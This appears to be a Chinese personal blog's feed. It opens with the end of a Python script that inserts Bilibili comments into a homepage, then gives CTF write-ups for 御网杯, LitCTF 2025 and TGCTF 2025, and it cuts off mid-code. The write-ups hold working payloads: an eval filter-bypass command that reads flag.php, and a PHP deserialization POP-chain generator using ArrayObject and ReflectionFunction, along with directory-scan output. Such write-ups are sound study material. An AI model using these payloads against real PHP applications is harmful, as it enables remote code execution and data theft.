&lt;/div&gt;</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;children&#x27;</span> <span class="hljs-keyword">in</span> c:<br>            sorted_children = <span class="hljs-built_in">sorted</span>(c[<span class="hljs-string">&#x27;children&#x27;</span>], key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-string">&#x27;time&#x27;</span>])<br>            replies_html = <span class="hljs-string">&#x27;&#x27;</span>.join(render(child, is_root=<span class="hljs-literal">False</span>) <span class="hljs-keyword">for</span> child <span class="hljs-keyword">in</span> sorted_children)<br>            html += <span class="hljs-string">f&#x27;&lt;div class=&quot;replies&quot;&gt;<span class="hljs-subst">&#123;replies_html&#125;</span>&lt;/div&gt;&#x27;</span><br>        <span class="hljs-keyword">return</span> html<br><br>    html_parts = [<span class="hljs-string">&#x27;&lt;div class=&quot;comments-section&quot;&gt;&lt;h2&gt;留言&lt;/h2&gt;&lt;div class=&quot;thread&quot;&gt;&#x27;</span>]<br>    <span class="hljs-keyword">for</span> root <span class="hljs-keyword">in</span> roots:<br>        html_parts.append(render(root, is_root=<span class="hljs-literal">True</span>))<br>    html_parts.append(<span class="hljs-string">&#x27;&lt;/div&gt;&lt;/div&gt;&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(html_parts)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_html</span>(<span class="hljs-params">html_snippet: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;从 input.html 读取模板，生成新的 index.html，评论区插入在“队员”之后，“联系方式”之前&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;input.html&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            src = f.read()<br><br>        <span class="hljs-comment"># ✅ 1. 删除已有的评论区（避免重复）</span><br>        src = re.sub(<span class="hljs-string">r&#x27;&lt;div class=&quot;comments-section&quot;&gt;.*?&lt;/div&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, src, flags=re.DOTALL)<br><br>        <span class="hljs-comment"># ✅ 2. 插入样式（确保样式存在，放在 &lt;/head&gt; 前）</span><br>        style = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        &lt;style&gt;</span><br><span class="hljs-string">            .comments-section&#123;background:#000;color:#fff;padding:20px;border-radius:5px;margin:30px 0&#125;</span><br><span class="hljs-string">            .comments-section h2&#123;font-size:22px;color:#fff;margin-bottom:15px;border-bottom:1px solid #333;padding-bottom:5px&#125;</span><br><span class="hljs-string">            .thread&#123;display:flex;flex-direction:column;gap:15px&#125;</span><br><span class="hljs-string">            .root,.reply&#123;display:flex;gap:12px;text-align:left&#125;</span><br><span class="hljs-string">            .avatar&#123;width:48px;height:48px;border-radius:50%;flex-shrink:0&#125;</span><br><span class="hljs-string">            .content&#123;flex:1&#125;</span><br><span class="hljs-string">            .head&#123;display:flex;gap:8px;margin-bottom:4px;flex-wrap:wrap&#125;</span><br><span class="hljs-string">            .u&#123;font-weight:bold;color:#fff;font-size:15px&#125;</span><br><span class="hljs-string">            .t&#123;color:#aaa;font-size:13px&#125;</span><br><span class="hljs-string">            .body&#123;color:#fff;font-size:16px;line-height:1.4;word-break:break-all&#125;</span><br><span class="hljs-string">            .reply-to&#123;color:#66ccff;font-size:15px&#125;</span><br><span class="hljs-string">            .replies&#123;margin-left:60px;border-left:2px solid #333;padding-left:12px;display:flex;flex-direction:column;gap:12px&#125;</span><br><span class="hljs-string">        &lt;/style&gt;</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br>        src = re.sub(<span class="hljs-string">r&#x27;&lt;/head&gt;&#x27;</span>, style + <span class="hljs-string">&#x27;\n&lt;/head&gt;&#x27;</span>, src, flags=re.I)<br><br>        <span class="hljs-comment"># ✅ 3. 精准定位：在 &quot;队员&quot; 模块后、&quot;联系方式&quot; 前插入评论区</span><br>        list_match = re.search(<span class="hljs-string">r&#x27;&lt;p[^&gt;]*class=&quot;[^&quot;]*list[^&quot;]*&quot;[^&gt;]*&gt;.*?&lt;/p&gt;&#x27;</span>, src, re.I | re.DOTALL)<br>        contact_match = re.search(<span class="hljs-string">r&#x27;&lt;p[^&gt;]*class=&quot;[^&quot;]*con[^&quot;]*&quot;[^&gt;]*&gt;.*?&lt;/p&gt;&#x27;</span>, src, re.I | re.DOTALL)<br><br>        <span class="hljs-keyword">if</span> list_match <span class="hljs-keyword">and</span> contact_match:<br>            list_end = list_match.end()<br>            contact_start = contact_match.start()<br><br>            middle_part = src[list_end:contact_start].strip()<br>            middle_clean = re.sub(<span class="hljs-string">r&#x27;&lt;div class=&quot;comments-section&quot;&gt;.*?&lt;/div&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, middle_part, flags=re.DOTALL).strip()<br><br>            insertion = <span class="hljs-string">f&#x27;\n<span class="hljs-subst">&#123;html_snippet&#125;</span>\n<span class="hljs-subst">&#123;middle_clean&#125;</span>\n&#x27;</span> <span class="hljs-keyword">if</span> middle_clean <span class="hljs-keyword">else</span> <span class="hljs-string">f&#x27;\n<span class="hljs-subst">&#123;html_snippet&#125;</span>\n&#x27;</span><br><br>            new_src = src[:list_end] + insertion + src[contact_start:]<br><br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;index.html&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(new_src)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;❌ 找不到 &#x27;队员&#x27; 或 &#x27;联系方式&#x27; 模块，无法插入评论区&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;生成 index.html 失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">&#x27;comments.txt&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;错误：缺少 comments.txt 文件&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">&#x27;input.html&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;错误：缺少 input.html 模板文件&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    comments = parse_comments_from_file(<span class="hljs-string">&#x27;comments.txt&#x27;</span>)<br>    html_snippet = build_comment_html(comments)<br><br>    <span class="hljs-keyword">if</span> update_html(html_snippet):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;✅ 成功生成 index.html，评论区已更新&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;❌ 生成 index.html 失败&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做这个主要是要给主页实现留言功能，然后了解到一些个人主页的评论是用github评论来实现的，那就想是用b站评论也可以，就搞了一下  </p><p>本人的前后端开发水平不高，代码这块是拷打ai，实现了一下想法而已，这样整个web服务是完全没用到php和py，就算在评论区想注马也没东西能执行，应该安全度会很高  </p><p>然后后端写个每个10分钟讯息执行三步py文件的脚本即可</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第九届御网杯</title>
    <link href="/2025/07/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF/"/>
    <url>/2025/07/18/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="第九届御网杯"><a href="#第九届御网杯" class="headerlink" title="第九届御网杯"></a>第九届御网杯</h1><p>历经12个小时高强度ctf，也是打完了御网杯线下赛。真的累，半决赛和决赛在同一天进行。  </p><p>先是半决赛，我们GWWAFZ排名13还是多少成功进入决赛，当时以为半决赛一等奖就是nisp证书了，没想到是决赛才决出一等奖。  </p><p>不过第一次线下赛就进决赛，还拿了二等奖，也不错了。  </p><p>这次我们ak了misc<br>我负责的web方向是解出了三题，还有一题全场暴零。  </p><p><img src="/../img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF/29f9bb3249e9fe5afe0af5a00cfd40f9.jpg" alt="1"><br><img src="/../img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF/3cdab4845d27e0864fdbb0c51f6728d1.jpg" alt="2"><br>由于比赛限制联网，还不准带手机，题目没有源码，只能根据回忆<br>故只提供我的web模糊向wp。  </p><p><img src="/../img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%BE%A1%E7%BD%91%E6%9D%AF/1.jpg"></p><h2 id="二次编码"><a href="#二次编码" class="headerlink" title="二次编码"></a>二次编码</h2><p>根据题目提示，在前端里找到三个相关参数，要让两个参数有值，不记得是不是只能有两个参数，好像三个都穿不行记不清了，当时参数乱填，然后排列组合出来了。</p><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>sqlmap直接跑出来  </p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>这题做的最久有两个多小时，恕我太菜了。<br>白盒rce，源码复制下来了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment"># flag in flag.php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/system|exec|highlight|show_source|include|passthru|php|flag|print_r|cat|head|tail|more|less/i&quot;</span>,<span class="hljs-variable">$cmd</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\?|\*/i&quot;</span>,<span class="hljs-variable">$cmd</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$cmd</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;HACK!!&quot;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;HACK!!!&quot;</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>必须要有<br>(“&#x2F;?|*&#x2F;i”,$cmd)<br>才会进入eval的if  </p><p>然后把一些能直接输出flag的命令ban了  </p><p>随便试了一下，进入hack的if时会有提示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--?<br><span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/flag.php&quot;</span>;<br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>));<br>?--&gt;<br></code></pre></td></tr></table></figure><p>这个trim还好，有echo用，主要是如何把flag的目录传到变量里   </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">trim</span><span class="hljs-params">()</span></span> 函数用于移除字符串两侧的空白字符或其他预定义字符。<br></code></pre></td></tr></table></figure><p>当时是想过直接用路径搭配通配符来给filename赋值的，但是尝试后发现这时的filename变为字符串变量，然后file_get_contents是不能在字符串变量里匹配通配符的  </p><p>所以要找一个把正确的文件名赋值给filename的办法  </p><p>最后尝试了很多次后，是使用了glob函数搭配通配符*来读取路径,然后用var_dump来输出文件名：</p><p>cmd&#x3D;$filename&#x3D;glob(“&#x2F;tmp&#x2F;<em>“);echo(“</em>“);var_dump($filename);<br>回显：<br>*array(2) { [0]&#x3D;&gt; string(13) “&#x2F;tmp&#x2F;flag.php” [1]&#x3D;&gt; string(16) “&#x2F;tmp&#x2F;tmpw_m0ic1v” }</p><p>又花了点时间，发现能直接用filename[0]来指定这个数组里的某一个值  </p><p>然后<br>cmd&#x3D;$filename&#x3D;glob(“&#x2F;tmp&#x2F;<em>“);$a&#x3D;trim(file_get_contents($filename[0]));echo(“</em>“);var_dump($filename);echo($a);<br>回显:<br>*array(2) { [0]&#x3D;&gt; string(13) “&#x2F;tmp&#x2F;flag.php” [1]&#x3D;&gt; string(16) “&#x2F;tmp&#x2F;tmpw_m0ic1v” } flag{GarnHSTCUTh6}  </p><p>大概流程是  </p><p>用glob来获取目录下的全部文件路径赋值给filename数组-&gt;用file_get_contents来filename[0]，即读取到正确的flag路径，然后成功包含flag.php-&gt;trim来提取flag.php里的内容赋值给a-&gt;echo 变量a，得到flag内容 </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>note-38</title>
    <link href="/2025/06/21/note-38/"/>
    <url>/2025/06/21/note-38/</url>
    
    <content type="html"><![CDATA[<h1 id="LitCTF-2025-君の名は"><a href="#LitCTF-2025-君の名は" class="headerlink" title="[LitCTF 2025]君の名は"></a>[LitCTF 2025]君の名は</h1><p>开题先给源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 显示当前文件的源代码</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// 关闭所有错误报告</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// 创建一个匿名函数，当调用时会执行`/readflag`命令</span><br><span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&#x27;die(`/readflag`);&#x27;</span>);<br><br><span class="hljs-comment">// 定义Taki类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Taki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$musubi</span>; <span class="hljs-comment">// 私有属性</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$magic</span>;  <span class="hljs-comment">// 私有属性</span><br>    <br>    <span class="hljs-comment">// __unserialize魔术方法，在反序列化时调用</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;musubi = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;musubi&#x27;</span>]; <span class="hljs-comment">// 从数组中设置musubi属性</span><br>        <span class="hljs-variable language_">$this</span>-&gt;magic = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;magic&#x27;</span>];   <span class="hljs-comment">// 从数组中设置magic属性</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;musubi)();       <span class="hljs-comment">// 调用musubi属性（假设它是可调用的）</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// __call魔术方法，当调用不存在的方法时触发</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-comment">// 动态创建对象并调用方法</span><br>        (<span class="hljs-keyword">new</span> <span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$args</span>[<span class="hljs-number">1</span>]))-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;magic&#125;();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 定义Mitsuha类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mitsuha</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$memory</span>;  <span class="hljs-comment">// 私有属性</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$thread</span>;  <span class="hljs-comment">// 私有属性</span><br>    <br>    <span class="hljs-comment">// __invoke魔术方法，当对象被当作函数调用时触发</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// 返回两个属性的连接</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;memory.<span class="hljs-variable language_">$this</span>-&gt;thread;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 定义KatawareDoki类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KatawareDoki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$soul</span>;           <span class="hljs-comment">// 私有属性</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$kuchikamizake</span>;  <span class="hljs-comment">// 私有属性</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;          <span class="hljs-comment">// 私有属性</span><br>    <br>    <span class="hljs-comment">// __toString魔术方法，当对象被当作字符串使用时触发</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// 调用soul对象的flag方法</span><br>        (<span class="hljs-variable language_">$this</span>-&gt;soul)-&gt;<span class="hljs-title function_ invoke__">flag</span>(<span class="hljs-variable">$this</span>-&gt;kuchikamizake,<span class="hljs-variable">$this</span>-&gt;name);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;call error!no flag!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 从POST请求中获取Litctf2025参数</span><br><span class="hljs-variable">$Litctf2025</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Litctf2025&#x27;</span>];<br><span class="hljs-comment">// 检查参数是否以&quot;O:&quot;或&quot;a:&quot;开头并跟着数字</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="hljs-variable">$Litctf2025</span>))&#123;<br>    <span class="hljs-comment">// 如果不匹配，则反序列化该参数</span><br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Litctf2025</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">// 如果匹配，输出提示信息</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;把O改成C不就行了吗,笨蛋!～(∠・ω&lt; )⌒☆&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>反序列化，看看ai怎么说  </p><p>ai没用，但是找到了出题人的wp   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Taki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$musubi</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$magic</span> = <span class="hljs-string">&quot;invoke&quot;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mitsuha</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$memory</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$thread</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KatawareDoki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$soul</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$kuchikamizake</span> = <span class="hljs-string">&quot;ReflectionFunction&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;\000lambda_1&quot;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Taki</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Mitsuha</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">KatawareDoki</span>();<br><br><span class="hljs-variable">$a</span>-&gt;musubi = <span class="hljs-variable">$b</span>;<span class="hljs-comment">// 1.把对象当成函数调用，触发__invoke()</span><br><span class="hljs-variable">$b</span>-&gt;thread = <span class="hljs-variable">$c</span>;<span class="hljs-comment">// 2. 把对象作为字符串使用，触发__toString()</span><br><span class="hljs-variable">$c</span>-&gt;soul = <span class="hljs-variable">$a</span>;<span class="hljs-comment">// 3. 调用不存在的方法，触发__call()</span><br><br><span class="hljs-variable">$arr</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;evil&quot;</span>=&gt;<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayObject</span>(<span class="hljs-variable">$arr</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$d</span>));<br></code></pre></td></tr></table></figure><p>有没见过的知识点<br>其中是要调用一个匿名函数，还有是使用arrayobject类型来反序列化出C开头的payload来绕过</p><h1 id="TGCTF-2025"><a href="#TGCTF-2025" class="headerlink" title="TGCTF 2025"></a>TGCTF 2025</h1><h2 id="什么文件上传？"><a href="#什么文件上传？" class="headerlink" title="什么文件上传？"></a>什么文件上传？</h2><p>好像上传啥都回显 hacker  </p><p>浅浅扫一下目录  </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[23:39:02]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /assets/<br><span class="hljs-selector-attr">[23:39:02]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">162</span>B  - /assets  -&gt;  http:<span class="hljs-comment">//127.0.0.1/assets/</span><br><span class="hljs-selector-attr">[23:39:04]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">162</span>B  - /css  -&gt;  http:<span class="hljs-comment">//127.0.0.1/css/</span><br><span class="hljs-selector-attr">[23:39:15]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">239</span>B  - /robots<span class="hljs-selector-class">.txt</span><br><span class="hljs-selector-attr">[23:39:19]</span> <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /upload<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[23:39:19]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /uploads/<br><span class="hljs-selector-attr">[23:39:19]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">162</span>B  - /uploads  -&gt;  http:<span class="hljs-comment">//127.0.0.1/uploads/</span><br></code></pre></td></tr></table></figure><p>原来前端里已经提示：机器人是啥？<br>在暗示有robots了  </p><p>robots:</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">User-Agent:</span> <span class="hljs-operator">*</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>admin<span class="hljs-symbol">/</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>private<span class="hljs-symbol">/</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-symbol">/baidu</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>s<span class="hljs-operator">?</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-symbol">/unlink</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-symbol">/phar</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">!</span>@<span class="hljs-operator">*</span>($^&amp;<span class="hljs-operator">*</span><span class="hljs-operator">!</span>@^&amp;<span class="hljs-operator">!</span><span class="hljs-operator">*</span>(@$<span class="hljs-comment"># &lt;--!文件上传后缀是三个小写字母 !@#$*&amp;^(!%@#$#^&amp;!--&gt;</span><br><span class="hljs-params">Disallow:</span> <span class="hljs-operator">/</span>class.php<br></code></pre></td></tr></table></figure><p>只有class.php 能连上<br>怎么是反序列化？  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 